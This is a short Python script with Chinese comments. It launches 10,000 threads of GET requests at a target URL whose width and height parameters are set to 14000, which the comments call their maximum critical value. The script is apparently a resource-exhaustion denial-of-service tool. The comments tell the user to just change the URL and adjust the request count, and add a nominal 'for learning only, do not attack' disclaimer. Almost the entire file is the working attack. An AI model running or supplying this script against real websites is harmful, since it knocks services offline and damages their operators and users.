import requests
import threading
import time

"""
    @ 单线程为测试,可忽略
    @ 使用时修改url即可
    @ 可根据实际情况修改访问次数,默认为10000
    @ 仅供学习参考,请勿实施攻击

"""


# 访问指定Url
def requser():
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36'
    }
    # 将参数的设置为最大临界值的链接
    url = "https://www.xxxx.com/xxxx?width=14000&height=14000"
    # url = "https://www.baidu.com/"
    req = requests.get(url=url, headers=headers)
    print("resuest Success!")


# 单线程访问
def single_thread():
    for i in range(50):
        requser()
        print(f"现在是第{i}次请求网页")


# 多线程访问
def multi_thread():
    print("multi_thread begin")
    threads = []
    for i in range(10000):  # 10000为访问次数,可根据实际调整
        threads.append(
            threading.Thread(target=requser)
        )
    print(threads)
    for thread in threads:
        thread.start()

    for thread in threads:
        thread.join()
    print("multi_thread end")


if __name__ == '__main__':
    # 单线程
    # single_thread()
    # 多线程
    start = time.time()
    multi_thread()
    end = time.time()
    t = end - start
    print(f"multi thread cost:{t} s")